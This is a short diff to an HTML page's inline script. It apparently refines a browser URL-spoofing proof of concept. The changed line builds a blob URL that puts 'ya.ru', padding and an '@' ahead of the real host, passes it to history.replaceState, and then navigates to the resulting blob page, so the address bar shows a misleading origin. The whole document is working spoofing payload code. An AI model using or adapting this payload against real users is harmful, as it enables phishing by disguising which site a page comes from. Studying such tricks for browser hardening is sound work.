@@ -15,7 +15,7 @@
     </script> -->
 
     <script>
-    var exp = 'Sergey (5) <script>history.replaceState("","","blob:http://ya.ru @' + location.host + '/")<\/script>';
+    var exp = 'Sergey (6) <script>history.replaceState("","","blob:'+location.protocol+'//ya.ru'+Array(2).join(' ')+'@'+location.host+'/")<\/script>';
     location=URL.createObjectURL(new Blob([exp], {type: "text/html"}))
     </script>
 </body>
